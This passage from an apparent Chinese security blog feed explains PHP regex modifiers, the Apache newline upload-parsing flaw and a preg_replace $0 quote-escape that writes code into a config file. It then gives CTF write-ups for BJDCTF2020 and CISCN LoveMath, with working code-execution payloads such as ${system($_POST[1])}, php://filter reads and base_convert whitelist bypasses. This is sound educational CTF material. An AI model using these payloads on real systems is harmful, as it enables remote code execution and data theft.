loading="lazy"></p><h3 id="U-PCRE-UNGREEDY"><a href="#U-PCRE-UNGREEDY" class="headerlink" title="U(PCRE_UNGREEDY)"></a><em>U(PCRE_UNGREEDY)</em></h3><p>这个修饰符逆转了量词的”贪婪”模式。 如果使用这个修饰符，会使量词默认为非贪婪的，通过量词后紧跟<code>?</code>的方式可以使其成为贪婪的。逆转贪婪功能</p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/php正则表达式模式修饰符/image-20200520182001826.png" style="zoom: 67%;" / loading="lazy"><h3 id="X-PCRE-EXTRA"><a href="#X-PCRE-EXTRA" class="headerlink" title="X(PCRE_EXTRA)"></a><em>X(PCRE_EXTRA)</em></h3><p>这个修饰符打开了 PCRE 与 perl 不兼容的附件功能。模式中的任意反斜线后就 ingen 一个 没有特殊含义的字符都会导致一个错误，以此保留这些字符以保证向后兼容性。 默认情况下，在 perl 中，反斜线紧跟一个没有特殊含义的字符被认为是该字符的原文。 当前没有其他特性由这个修饰符控制。</p><h3 id="J-PCRE-INFO-JCHANGED"><a href="#J-PCRE-INFO-JCHANGED" class="headerlink" title="J(PCRE_INFO_JCHANGED)"></a><em>J(PCRE_INFO_JCHANGED)</em></h3><p>内部选项设置<code>(?J)</code>修改本地的<em>PCRE_DUPNAMES</em>选项。允许子组重名。 (译注：只能通过内部选项设置，外部的 <code>/J</code> 设置会产生错误。)</p><h3 id="u-PCRE-UTF8"><a href="#u-PCRE-UTF8" class="headerlink" title="u(PCRE_UTF8)"></a><em>u(PCRE_UTF8)</em></h3><p>此修正符打开一个与 <code>perl</code> 不兼容的附加功能。模式和目标字符串都被认为是<code>utf-8</code>的。 无效的目标字符串会导致 <code>preg_*</code> 函数什么都匹配不到； 无效的模式字符串会导致 <code>E_WARNING</code> 级别的错误。PHP5.3.4 后，5字节和6字节的 UTF-8 字符序列被考虑为无效<code>(resp. PCRE 7.3 2007-08-28)</code>。 以前就被认为是无效的 UTF-8。</p><h3 id="S"><a href="#S" class="headerlink" title="S"></a><em>S</em></h3><p>当一个模式需要多次使用的时候，为了得到匹配速度的提升，值得花费一些时间 对其进行一些额外的分析。如果设置了这个修饰符，这个额外的分析就会执行。当前， 这种对一个模式的分析仅仅适用于非锚定模式的匹配(即没有单独的固定开始字符)。</p><h3 id="匹配换行问题"><a href="#匹配换行问题" class="headerlink" title="$匹配换行问题"></a><em>$匹配换行问题</em></h3><p>在多行模式下，因为是多行模式，所以<code>$</code>可以匹配每一行的结尾，且不会匹配换行符</p><p>在单行模式下，将整个文本视为一行，所以<code>$</code>匹配的是文本的结尾，且包括结尾的换行符</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/php%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%A8%A1%E5%BC%8F%E4%BF%AE%E9%A5%B0%E7%AC%A6/image-20200520163746726.png" alt="" loading="lazy"></p><p>例如Apache的换行解析漏洞，因为<code>$</code>能匹配<code>\n</code>，所以上传<code>shell.php\n</code>，仍然可以让Apache解析php文件</p><p>那么该如何解决这种问题呢？</p><p>在php中有一个修饰符<code>D</code>，<code>D</code>是php中独有的修饰符，其作用是告诉引擎<code>$</code>仅匹配文本结尾，不再匹配到一个换行符，在php中可以用<code>D</code>修饰符来解决问题，那么不在php环境下呢？在此之前就需要屡一下正则中具有“首尾”界定符意思的字符：</p><ul><li><code>^</code></li><li><code>$</code></li><li><code>\A</code></li><li><code>\Z</code></li><li><code>\z</code></li></ul><p>第三个<code>\A</code>表示“字符串的开头”，第四个<code>\Z</code>表示行的结尾，其效果其实和<code>$</code>完全一样，第五个<code>\z</code>，表示“字符串的结尾”，所以<code>\A</code>和<code>\z</code>这两个界定符才是真正表示“字符串开头”和“字符串结尾”的，如下：</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/php%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%A8%A1%E5%BC%8F%E4%BF%AE%E9%A5%B0%E7%AC%A6/image-20200520170351144.png" alt="" loading="lazy"></p><h3 id="正则替换"><a href="#正则替换" class="headerlink" title="正则替换"></a><em>正则替换</em></h3><p>利用<code>$0</code>来进行正则替换使符号逃逸</p><p>有如下代码：</p><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token variable">$api</span> <span class="token operator">=</span> <span class="token function">addslashes</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'api'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$file</span> <span class="token operator">=</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token string">'./option.php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$file</span> <span class="token operator">=</span> <span class="token function">preg_replace</span><span class="token punctuation">(</span><span class="token string">"/\\\$API = '.*';/s"</span><span class="token punctuation">,</span> <span class="token string">"\$API = '{$api}';"</span><span class="token punctuation">,</span> <span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">file_put_contents</span><span class="token punctuation">(</span><span class="token string">'./option.php'</span><span class="token punctuation">,</span> <span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>我们可以对<code>option.php</code>进行写操作，下面看如何利用<code>$0</code>来绕过这个正则的限制</p><p>传入<code>?api=;phpinfo();</code>，<code>option.php</code>中的内容变成了</p><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token variable">$API</span> <span class="token operator">=</span> <span class="token string">';phpinfo();'</span><span class="token punctuation">;</span></code></pre><p>再传入<code>?api=$0</code>，<code>option.php</code>中的内容变成了</p><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token variable">$API</span> <span class="token operator">=</span> <span class="token string">'$API = '</span><span class="token punctuation">;</span><span class="token function">phpinfo</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token string">';'</span><span class="token punctuation">;</span></code></pre><p>成功使得单引号逃逸，造成代码执行，$0等的使用方法：</p><ul><li><code>$1</code>表示捕获组1，<code>$0</code>表示整个匹配组。</li><li>如果<code>$1</code>后面紧接一个数字，则需要写成<code>\${1}</code>的形式。</li></ul><p>再来看看<code>preg_replace</code>的具体使用方法</p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/php正则表达式模式修饰符/image-20200520192912940.png" style="zoom: 80%;" / loading="lazy"><h3 id="巨人的肩膀"><a href="#巨人的肩膀" class="headerlink" title="巨人的肩膀"></a><em>巨人的肩膀</em></h3><ul><li><a href="https://www.leavesongs.com/PENETRATION/thinking-about-config-file-arbitrary-write.html" target="_blank" rel="noopener">经典写配置漏洞与几种变形</a></li><li><a href="https://www.smi1e.top/%e5%b0%8f%e5%af%86%e5%9c%88%e7%bb%8f%e5%85%b8%e5%86%99%e9%85%8d%e7%bd%ae%e6%bc%8f%e6%b4%9e%e4%b8%8e%e5%87%a0%e7%a7%8d%e5%8f%98%e5%bd%a2%e5%ad%a6%e4%b9%a0/" target="_blank" rel="noopener">[小密圈]经典写配置漏洞与几种变形学习</a></li><li><a href="https://xz.aliyun.com/t/2557" target="_blank" rel="noopener">深入研究preg_replace与代码执行</a></li><li><a href="https://www.php.net/manual/zh/reference.pcre.pattern.modifiers.php" target="_blank" rel="noopener">PHP模式修饰符</a></li></ul><h3 id="栗子"><a href="#栗子" class="headerlink" title="栗子"></a>栗子</h3><h4 id="BJDCTF2020-ZJCTF—不过如此"><a href="#BJDCTF2020-ZJCTF—不过如此" class="headerlink" title="BJDCTF2020-ZJCTF—不过如此"></a>BJDCTF2020-ZJCTF—不过如此</h4><p>首先题目先给出了一段代码：</p><pre class=" language-PHP"><code class="language-PHP"><?phperror_reporting(0);$text = $_GET["text"];$file = $_GET["file"];if(isset($text)&&(file_get_contents($text,'r')==="I have a dream")){    echo "<br><h1>".file_get_contents($text,'r')."</h1></br>";    if(preg_match("/flag/",$file)){        die("Not now!");    }    include($file);  //next.php}else{    highlight_file(__FILE__);}?></code></pre><p>构造<code>payload</code>读取<code>next.php</code>的内容</p><pre class=" language-php"><code class="language-php">http<span class="token punctuation">:</span><span class="token comment" spellcheck="true">//e4d6525b-eb85-41c7-9bbb-f48802a4eb3a.node3.buuoj.cn</span><span class="token operator">?</span>text<span class="token operator">=</span>data<span class="token punctuation">:</span><span class="token comment" spellcheck="true">//text/plain;base64,SSBoYXZlIGEgZHJlYW0=</span><span class="token operator">&amp;</span>file<span class="token operator">=</span>php<span class="token punctuation">:</span><span class="token comment" spellcheck="true">//filter/read=convert.base64-encode/resource=next.php</span></code></pre><p>将读到的base64解码得到<code>next.php</code>文件的内容</p><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token variable">$id</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'id'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string">'id'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token variable">$id</span><span class="token punctuation">;</span><span class="token keyword">function</span> <span class="token function">complex</span><span class="token punctuation">(</span><span class="token variable">$re</span><span class="token punctuation">,</span> <span class="token variable">$str</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">return</span> <span class="token function">preg_replace</span><span class="token punctuation">(</span>        <span class="token string">'/('</span> <span class="token punctuation">.</span> <span class="token variable">$re</span> <span class="token punctuation">.</span> <span class="token string">')/ei'</span><span class="token punctuation">,</span>        <span class="token string">'strtolower("\\1")'</span><span class="token punctuation">,</span>        <span class="token variable">$str</span>    <span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">foreach</span><span class="token punctuation">(</span><span class="token variable">$_GET</span> <span class="token keyword">as</span> <span class="token variable">$re</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token variable">$str</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">echo</span> <span class="token function">complex</span><span class="token punctuation">(</span><span class="token variable">$re</span><span class="token punctuation">,</span> <span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">.</span> <span class="token string">"\n"</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">function</span> <span class="token function">getFlag</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    @<span class="token function">eval</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'cmd'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p>看到了<code>complex</code>方法中的<code>preg_replace</code>函数，里面的正则表达式使用了<code>e</code>修饰符，利用上面的原理构造<code>payload</code>：<code>?\S*=${system($_POST[1])}</code>   POST:<code>1=cat /flag;</code>即可拿到<code>flag</code>，也可以利用里面的<code>getFlag</code>方法<code>?\S*={${getFlag()}}&amp;cmd=highlight_file(&#39;/flag&#39;);</code>也可以拿到<code>flag</code></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;php单双引号的区别：&lt;/p&gt;
&lt;p&gt;单引号：php不会读取里面的变量，作为纯字符串处理&lt;/p&gt;
&lt;p&gt;双引号：PHP会尝试读取里面的变量，或者反斜杠表示的特殊符号，例如&lt;code&gt;\n&lt;/code&gt;，&lt;code&gt;\0&lt;/code&gt;等&lt;/p&gt;
&lt;p&gt;处理字符串变量替换的连接速度方面，php7前单引号会快些，而在php7之后就没区别了，&lt;a href=&quot;https://www.laruence.com/2008/08/19/338.html&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;详见&lt;/a&gt;&lt;/p&gt;
    
    </summary>
    
    
      <category term="备忘录" scheme="https://www.extrader.top/categories/%E5%A4%87%E5%BF%98%E5%BD%95/"/>
    
    
      <category term="php" scheme="https://www.extrader.top/tags/php/"/>
    
      <category term="正则" scheme="https://www.extrader.top/tags/%E6%AD%A3%E5%88%99/"/>
    
  </entry>
  
  <entry>
    <title>CISCN-LoveMath-php动态函数执行</title>
    <link href="https://www.extrader.top/2020/05/17/CISCN-LoveMath-php%E5%8A%A8%E6%80%81%E5%87%BD%E6%95%B0%E6%89%A7%E8%A1%8C/"/>
    <id>https://www.extrader.top/2020/05/17/CISCN-LoveMath-php%E5%8A%A8%E6%80%81%E5%87%BD%E6%95%B0%E6%89%A7%E8%A1%8C/</id>
    <published>2020-05-17T09:53:48.000Z</published>
    <updated>2020-07-14T10:42:02.445Z</updated>
    
    <content type="html"><![CDATA[<p>  先看到题目给出的源码：</p><a id="more"></a><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//听说你很喜欢数学，不知道你是否爱它胜过爱flag</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token function">show_source</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>    <span class="token comment" spellcheck="true">//例子 c=20-1</span>    <span class="token variable">$content</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$content</span><span class="token punctuation">)</span> <span class="token operator">>=</span> <span class="token number">80</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">"太长了不会算"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token variable">$blacklist</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">' '</span><span class="token punctuation">,</span> <span class="token string">'\t'</span><span class="token punctuation">,</span> <span class="token string">'\r'</span><span class="token punctuation">,</span> <span class="token string">'\n'</span><span class="token punctuation">,</span><span class="token string">'\''</span><span class="token punctuation">,</span> <span class="token string">'"'</span><span class="token punctuation">,</span> <span class="token string">'`'</span><span class="token punctuation">,</span> <span class="token string">'\['</span><span class="token punctuation">,</span> <span class="token string">'\]'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">foreach</span> <span class="token punctuation">(</span><span class="token variable">$blacklist</span> <span class="token keyword">as</span> <span class="token variable">$blackitem</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">'/'</span> <span class="token punctuation">.</span> <span class="token variable">$blackitem</span> <span class="token punctuation">.</span> <span class="token string">'/m'</span><span class="token punctuation">,</span> <span class="token variable">$content</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">"请不要输入奇奇怪怪的字符"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token comment" spellcheck="true">//常用数学函数http://www.w3school.com.cn/php/php_ref_math.asp</span>    <span class="token variable">$whitelist</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'abs'</span><span class="token punctuation">,</span> <span class="token string">'acos'</span><span class="token punctuation">,</span> <span class="token string">'acosh'</span><span class="token punctuation">,</span> <span class="token string">'asin'</span><span class="token punctuation">,</span> <span class="token string">'asinh'</span><span class="token punctuation">,</span> <span class="token string">'atan2'</span><span class="token punctuation">,</span> <span class="token string">'atan'</span><span class="token punctuation">,</span> <span class="token string">'atanh'</span><span class="token punctuation">,</span> <span class="token string">'base_convert'</span><span class="token punctuation">,</span> <span class="token string">'bindec'</span><span class="token punctuation">,</span> <span class="token string">'ceil'</span><span class="token punctuation">,</span> <span class="token string">'cos'</span><span class="token punctuation">,</span> <span class="token string">'cosh'</span><span class="token punctuation">,</span> <span class="token string">'decbin'</span><span class="token punctuation">,</span> <span class="token string">'dechex'</span><span class="token punctuation">,</span> <span class="token string">'decoct'</span><span class="token punctuation">,</span> <span class="token string">'deg2rad'</span><span class="token punctuation">,</span> <span class="token string">'exp'</span><span class="token punctuation">,</span> <span class="token string">'expm1'</span><span class="token punctuation">,</span> <span class="token string">'floor'</span><span class="token punctuation">,</span> <span class="token string">'fmod'</span><span class="token punctuation">,</span> <span class="token string">'getrandmax'</span><span class="token punctuation">,</span> <span class="token string">'hexdec'</span><span class="token punctuation">,</span> <span class="token string">'hypot'</span><span class="token punctuation">,</span> <span class="token string">'is_finite'</span><span class="token punctuation">,</span> <span class="token string">'is_infinite'</span><span class="token punctuation">,</span> <span class="token string">'is_nan'</span><span class="token punctuation">,</span> <span class="token string">'lcg_value'</span><span class="token punctuation">,</span> <span class="token string">'log10'</span><span class="token punctuation">,</span> <span class="token string">'log1p'</span><span class="token punctuation">,</span> <span class="token string">'log'</span><span class="token punctuation">,</span> <span class="token string">'max'</span><span class="token punctuation">,</span> <span class="token string">'min'</span><span class="token punctuation">,</span> <span class="token string">'mt_getrandmax'</span><span class="token punctuation">,</span> <span class="token string">'mt_rand'</span><span class="token punctuation">,</span> <span class="token string">'mt_srand'</span><span class="token punctuation">,</span> <span class="token string">'octdec'</span><span class="token punctuation">,</span> <span class="token string">'pi'</span><span class="token punctuation">,</span> <span class="token string">'pow'</span><span class="token punctuation">,</span> <span class="token string">'rad2deg'</span><span class="token punctuation">,</span> <span class="token string">'rand'</span><span class="token punctuation">,</span> <span class="token string">'round'</span><span class="token punctuation">,</span> <span class="token string">'sin'</span><span class="token punctuation">,</span> <span class="token string">'sinh'</span><span class="token punctuation">,</span> <span class="token string">'sqrt'</span><span class="token punctuation">,</span> <span class="token string">'srand'</span><span class="token punctuation">,</span> <span class="token string">'tan'</span><span class="token punctuation">,</span> <span class="token string">'tanh'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token function">preg_match_all</span><span class="token punctuation">(</span><span class="token string">'/[a-zA-Z_\x7f-\xff][a-zA-Z_0-9\x7f-\xff]*/'</span><span class="token punctuation">,</span> <span class="token variable">$content</span><span class="token punctuation">,</span> <span class="token variable">$used_funcs</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token keyword">foreach</span> <span class="token punctuation">(</span><span class="token variable">$used_funcs</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token keyword">as</span> <span class="token variable">$func</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">in_array</span><span class="token punctuation">(</span><span class="token variable">$func</span><span class="token punctuation">,</span> <span class="token variable">$whitelist</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">"请不要输入奇奇怪怪的函数"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token comment" spellcheck="true">//帮你算出答案</span>    <span class="token function">eval</span><span class="token punctuation">(</span><span class="token string">'echo '</span><span class="token punctuation">.</span><span class="token variable">$content</span><span class="token punctuation">.</span><span class="token string">';'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p>代码审计限制条件</p><ul><li>传入的<code>c</code>的字符串长度大小不能大于80</li><li>传入的字符串不能包含<code>&#39; &#39;</code>, <code>&#39;\t&#39;</code>, <code>&#39;\r&#39;</code>, <code>&#39;\n&#39;</code>,<code>&#39;\&#39;&#39;</code>, <code>&#39;&quot;&#39;</code>, <code>&#39;``&#39;</code>, <code>&#39;\[&#39;</code>, <code>&#39;\]&#39;</code></li><li><code>preg_match_all</code>将匹配到的结果传给<code>$used_funcs</code>，<code>$used_funcs</code>只能是<code>$whitelist</code>中的函数，意识就是传入的字符串中的词组也只能是<code>$whitelist</code>中的单词</li></ul><p>以上条件满足后即可传入<code>eval</code>中执行代码</p><h3 id="方法一"><a href="#方法一" class="headerlink" title="方法一"></a>方法一</h3><pre class=" language-php"><code class="language-php"><span class="token operator">?</span>c<span class="token operator">=</span><span class="token variable">$pi</span><span class="token operator">=</span><span class="token function">base_convert</span><span class="token punctuation">(</span><span class="token number">3761671484</span><span class="token punctuation">,</span><span class="token number">13</span><span class="token punctuation">,</span><span class="token number">36</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token function">dechex</span><span class="token punctuation">(</span><span class="token number">1598506324</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">(</span>$<span class="token variable">$pi</span><span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token number">1</span><span class="token punctuation">}</span><span class="token punctuation">(</span><span class="token punctuation">(</span>$<span class="token variable">$pi</span><span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token number">2</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token operator">&amp;</span><span class="token number">1</span><span class="token operator">=</span>system<span class="token operator">&amp;</span><span class="token number">2</span><span class="token operator">=</span>tac <span class="token operator">/</span>flag</code></pre><p>分析：</p><ul><li><code>base_convert</code>函数的功能是在任意进制的字符串之间转换数字<code>base_convert(37907361743,10,36)  ==&gt;  hex2bin</code></li><li><code>dechex(1598506324)  ==&gt;  5f474554</code>，<code>hex2bin(&quot;5f474554&quot;)  ==&gt;  _GET</code></li><li>选用<code>pi</code>的原因是因为题目有长度限制，白名单中最短的就是这两个字符<code>pi</code>，故选它</li><li>当<code>$pi</code>=<code>_GET</code>之后再在前面加一个<code>$</code>就形成了<code>$_GET</code></li><li><code>($$pi){1}(($$pi){2})</code>翻译过来就是<code>($_GET){1}(($_GET){2}) === $_GET[1]($_GET[2])</code>，传入<code>1=system</code>即可进行命令执行</li></ul><p>举一反三，那么我们改如何构造出这种方法呢？<code>base_convert</code>的进制转换不知道的话又怎么知道该传入什么数字和进制呢？于是写出构造脚本：</p><p><code>base_convert</code>函数构造：</p><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token variable">$a</span> <span class="token operator">=</span> <span class="token string">'hex2bin'</span><span class="token punctuation">;</span><span class="token keyword">for</span><span class="token punctuation">(</span><span class="token variable">$i</span> <span class="token operator">=</span> <span class="token number">2</span><span class="token punctuation">;</span> <span class="token variable">$i</span> <span class="token operator">&lt;</span> <span class="token number">37</span><span class="token punctuation">;</span> <span class="token variable">$i</span><span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token variable">$j</span> <span class="token operator">=</span> <span class="token number">2</span><span class="token punctuation">;</span> <span class="token variable">$j</span> <span class="token operator">&lt;</span> <span class="token number">37</span><span class="token punctuation">;</span> <span class="token variable">$j</span><span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">is_numeric</span><span class="token punctuation">(</span><span class="token function">base_convert</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">,</span> <span class="token variable">$i</span><span class="token punctuation">,</span> <span class="token variable">$j</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>            <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">base_convert</span><span class="token punctuation">(</span><span class="token function">base_convert</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">,</span> <span class="token variable">$i</span><span class="token punctuation">,</span> <span class="token variable">$j</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token variable">$j</span><span class="token punctuation">,</span> <span class="token variable">$i</span><span class="token punctuation">)</span> <span class="token operator">===</span> <span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">{</span>                <span class="token keyword">echo</span> <span class="token string">'len='</span><span class="token punctuation">.</span><span class="token function">strlen</span><span class="token punctuation">(</span><span class="token function">base_convert</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">,</span> <span class="token variable">$i</span><span class="token punctuation">,</span> <span class="token variable">$j</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token string">' '</span><span class="token punctuation">.</span><span class="token string">'base_convert参数->'</span><span class="token punctuation">.</span><span class="token function">base_convert</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">,</span> <span class="token variable">$i</span><span class="token punctuation">,</span> <span class="token variable">$j</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token string">' '</span><span class="token punctuation">.</span><span class="token variable">$j</span><span class="token punctuation">.</span><span class="token string">' '</span><span class="token punctuation">.</span><span class="token variable">$i</span><span class="token punctuation">.</span><span class="token string">' '</span><span class="token punctuation">.</span><span class="token string">"\n"</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token delimiter">?></span></code></pre><p>这样即可得到所有的进制转换结果，当然如果题目没有引号限制，<code>is_numeric</code>函数也可以去掉，在里面选取所需要的即可</p><p>那么<code>dechex</code>如何构造呢？这个就简单了，两行代码就可以搞定</p><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token variable">$a</span> <span class="token operator">=</span> <span class="token string">"_GET"</span><span class="token punctuation">;</span><span class="token variable">$num</span> <span class="token operator">=</span> <span class="token function">hexdec</span><span class="token punctuation">(</span><span class="token function">bin2hex</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token variable">$num</span> <span class="token punctuation">.</span> <span class="token string">"\n"</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token punctuation">(</span><span class="token function">base_convert</span><span class="token punctuation">(</span><span class="token number">3761671484</span><span class="token punctuation">,</span><span class="token number">13</span><span class="token punctuation">,</span><span class="token number">36</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token function">dechex</span><span class="token punctuation">(</span><span class="token variable">$num</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter">?></span></code></pre><p>输出的结果既是可传入的值</p><h3 id="方法二"><a href="#方法二" class="headerlink" title="方法二"></a>方法二</h3><pre class=" language-php"><code class="language-php"><span class="token operator">?</span>c<span class="token operator">=</span><span class="token variable">$pi</span><span class="token operator">=</span>base_convert<span class="token punctuation">,</span><span class="token variable">$pi</span><span class="token punctuation">(</span><span class="token number">47138</span><span class="token punctuation">,</span><span class="token number">20</span><span class="token punctuation">,</span><span class="token number">36</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token variable">$pi</span><span class="token punctuation">(</span><span class="token number">8768397090111664438</span><span class="token punctuation">,</span><span class="token number">10</span><span class="token punctuation">,</span><span class="token number">30</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token number">1</span><span class="token punctuation">}</span><span class="token punctuation">)</span></code></pre><p>分析：</p><ul><li><code>base_convert(47138,20,36)  ==&gt;  exec</code>，exec执行一个外部程序，返回最后一行内容</li><li><code>base_convert(8768397090111664438,10,30)  ==&gt;   getallheaders</code>，获取全部 HTTP 请求头信息</li><li>以上语句翻译下来就是<code>exec(getallheaders(){1})</code>，可以获取请求头第一个字段的值，<code>[]</code>被waf可以用<code>{}</code>包囊数字来解决代替绕过中括号和引号</li></ul><p>发包即可拿到flag</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/CISCN-LoveMath-php%E5%8A%A8%E6%80%81%E5%87%BD%E6%95%B0%E6%89%A7%E8%A1%8C/image-20200517213809635.png" alt="" loading="lazy"></p><p>当然这里直接<code>cat flag</code>也是可以的，如下：</p><pre class=" language-php"><code class="language-php"><span class="token operator">?</span>c<span class="token operator">=</span><span class="token punctuation">(</span><span class="token variable">$pi</span><span class="token operator">=</span>base_convert<span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token number">47138</span><span class="token punctuation">,</span><span class="token number">20</span><span class="token punctuation">,</span><span class="token number">36</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token variable">$pi</span><span class="token punctuation">(</span><span class="token number">3761671484</span><span class="token punctuation">,</span><span class="token number">13</span><span class="token punctuation">,</span><span class="token number">36</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token function">dechex</span><span class="token punctuation">(</span><span class="token number">109270211243818</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span></code></pre><p>命令执行就是<code>exec(&quot;cat /*&quot;)</code>，可以打印出flag</p><h3 id="方法三"><a href="#方法三" class="headerlink" title="方法三"></a>方法三</h3><p>利用异或将字符串转化成我们想要的字符串，例如我们需要<code>$_GET</code>，那么就要获得<code>_GET</code>，FUZZ代码如下：</p><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token variable">$payload</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'abs'</span><span class="token punctuation">,</span> <span class="token string">'acos'</span><span class="token punctuation">,</span> <span class="token string">'acosh'</span><span class="token punctuation">,</span> <span class="token string">'asin'</span><span class="token 